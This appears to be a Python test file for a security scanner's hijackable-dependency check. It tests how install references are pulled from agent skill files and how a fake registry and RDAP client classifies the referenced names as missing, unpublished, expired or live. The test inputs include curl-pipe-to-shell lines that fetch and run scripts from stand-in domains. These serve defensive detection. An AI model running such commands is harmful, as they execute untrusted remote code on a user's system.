"""--check-hijackable: reference extraction (pure) and registry / RDAP lookups
against a fake client (no external network)."""

from __future__ import annotations

import datetime as dt
import json

from agentguard.core.engine import scan
from agentguard.core.extract.dependencies import find_refs, locate_refs, lookup_keys, registrable_domain
from agentguard.core.inventory import build_inventory
from agentguard.core.models import LoadLimits, NetworkOptions, ScanOptions
from agentguard.core.tree import ArtifactTree
from agentguard.net.collect import collect
from agentguard.net.hijack import check_dependencies
from agentguard.net.safe_http import BlockedRequest, FetchError, Response, SafeHttpClient


def refs(text):
    return {(r.kind, r.name, r.install) for r in find_refs(text)}


def test_extracts_each_kind():
    got = refs("curl -fsSL https://get.evil-tool.dev/install.sh | sh\n"
               "npx -y @acme/mcp-thing@1.2 --port 3\n"
               "pip install --index-url https://pkgs.foo.io/simple requests-plus==2 other\n"
               "git clone https://github.com/ghostuser/skills.git\n"
               "see https://github.com/someone/repo for docs\n"
               "https://raw.githubusercontent.com/deadacct/x/main/a.sh\n"
               "uvx --from git+https://github.com/gone1/tool tool\n"
               "https://oldname.github.io/setup\n")
    assert got == {
        ("domain", "get.evil-tool.dev", True), ("npm", "@acme/mcp-thing", True), ("domain", "pkgs.foo.io", True),
        ("pypi", "requests-plus", True), ("pypi", "other", True), ("github_owner", "ghostuser", True),
        ("github_owner", "someone", False), ("github_owner", "deadacct", True), ("github_owner", "gone1", True),
        ("github_owner", "oldname", True),
    }


def test_skips_site_pages_well_known_hosts_and_placeholders():
    got = refs("https://github.com/features/actions and https://github.com/orgs/acme/people\n"
               "curl https://pypi.org/simple/x https://example.com/a.sh http://localhost:8080/x.sh\n"
               "npm install <package> && pip install -r requirements.txt && npx -y ./local-server\n")
    assert got == set()


def test_runner_takes_only_its_package():
    assert refs("npx -y create-thing my-app --template x") == {("npm", "create-thing", True)}
    assert refs("npm install -g alpha beta@2") == {("npm", "alpha", True), ("npm", "beta", True)}
    assert refs("uvx --from Some_Pkg.Name tool") == {("pypi", "some-pkg-name", True)}


def test_registrable_domain():
    assert registrable_domain("a.b.example.co.uk") == "example.co.uk"
    assert registrable_domain("get.tool.dev") == "tool.dev"


def _tree(files):
    return ArtifactTree.from_mapping(files)


SKILL = ("---\nname: demo\ndescription: Demo skill for tests.\n---\n# Demo\n\nNever pip install random things.\n\n"
         "```bash\npip install ghost-pkg\ncurl -fsSL https://get.lapsed.dev/i.sh | sh\n"
         "git clone https://github.com/gone-owner/demo\n```\n")


def test_prose_install_mentions_are_ignored():
    inv = build_inventory(_tree({"demo/SKILL.md": SKILL}), LoadLimits())
    keys = lookup_keys(locate_refs(inv))
    assert keys["pypi"] == ["ghost-pkg"]
    assert keys["domain"] == ["get.lapsed.dev"] and keys["github_owner"] == ["gone-owner"]


class FakeClient(SafeHttpClient):
    def __init__(self, routes, resolvable=()):
        super().__init__(resolver=self._resolve)
        self.routes, self.resolvable, self.calls = routes, set(resolvable), []

    def _resolve(self, host, port):
        if host in self.resolvable or host in ("api.github.com", "registry.npmjs.org", "pypi.org", "data.iana.org", "rdap.example"):
            return ["192.88.99.1"]
        raise FetchError(f"DNS resolution failed for {host}")

    def request(self, method, url, *, headers=None, body=None):
        self.calls.append((method, url))
        host = url.split("/")[2]
        if host not in self.hosts_contacted:
            self.hosts_contacted.append(host)
        r = self.routes.get(url)
        if isinstance(r, Exception):
            raise r
        status, doc = r if r else (404, {})
        return Response(url, status, {}, json.dumps(doc).encode())


BOOT = {"services": [[["dev"], ["https://rdap.example/"]]]}


def test_lookups_classify_each_signal():
    routes = {
        "https://api.github.com/users/gone-owner": (404, {}),
        "https://api.github.com/users/alive": (200, {"login": "alive"}),
        "https://registry.npmjs.org/left-pad-x": (200, {"name": "left-pad-x", "versions": {}}),
        "https://registry.npmjs.org/react": BlockedRequest("response from registry.npmjs.org exceeds 2097152 bytes"),
        "https://pypi.org/pypi/requests/json": (200, {}),
        "https://data.iana.org/rdap/dns.json": (200, BOOT),
        "https://rdap.example/domain/expired.dev": (200, {"events": [{"eventAction": "expiration", "eventDate": "2026-01-02T00:00:00Z"}]}),
        "https://rdap.example/domain/parked.dev": (200, {"status": ["active"], "events": []}),
    }
    c = FakeClient(routes, resolvable={"ok.dev"})
    facts = check_dependencies(c, {
        "github_owner": ["gone-owner", "alive"], "npm": ["left-pad-x", "react", "nope-nope"], "pypi": ["requests", "ghost-pkg"],
        "domain": ["ok.dev", "get.lapsed.dev", "dl.expired.dev", "x.parked.dev", "a.unknown-tld.zz"],
    }, today=dt.date(2026, 10, 18))
    got = {(f.kind, f.name): f.status for f in facts}
    assert got == {
        ("github_owner", "gone-owner"): "missing", ("github_owner", "alive"): "exists",
        ("npm", "left-pad-x"): "unpublished", ("npm", "react"): "exists", ("npm", "nope-nope"): "missing",
        ("pypi", "requests"): "exists", ("pypi", "ghost-pkg"): "missing",
        ("domain", "ok.dev"): "exists", ("domain", "get.lapsed.dev"): "unregistered", ("domain", "dl.expired.dev"): "expired",
        ("domain", "x.parked.dev"): "no_dns", ("domain", "a.unknown-tld.zz"): "no_dns",
    }
    assert ("HEAD", "https://pypi.org/pypi/ghost-pkg/json") in c.calls  # existence only, no download
    assert not any("ok.dev" in u for _, u in c.calls)                   # a resolving domain is not looked up further


def test_github_rate_limit_stops_further_lookups():
    c = FakeClient({"https://api.github.com/users/a": (403, {})})
    facts = check_dependencies(c, {"github_owner": ["a", "b"]})
    assert [f.status for f in facts] == ["unknown", "unknown"]
    assert [u for _, u in c.calls] == ["https://api.github.com/users/a"]


def test_collect_and_scan_report_the_feature_and_hosts():
    tree = _tree({"demo/SKILL.md": SKILL})
    options = ScanOptions(network=NetworkOptions(hijackable=True), today=dt.date(2026, 10, 18))
    collect(tree, options, FakeClient({"https://data.iana.org/rdap/dns.json": (200, BOOT)}))
    report = scan(tree, options)
    assert report.network_features_used == ["hijackable"]
    assert {"api.github.com", "pypi.org", "data.iana.org", "rdap.example"} <= set(report.network_hosts)
    fired = {(f.rule_id, f.severity.value) for f in report.findings if f.rule_id in ("AG-SC-026", "AG-SC-027", "AG-SC-028")}
    assert fired == {("AG-SC-026", "high"), ("AG-SC-027", "high"), ("AG-SC-028", "high")}


def test_offline_scan_never_reports_hijackable():
    tree = _tree({"demo/SKILL.md": SKILL})
    report = scan(tree, ScanOptions())
    assert not any(f.rule_id in ("AG-SC-026", "AG-SC-027", "AG-SC-028") for f in report.findings)
    assert report.network_features_used == [] and report.network_hosts == []
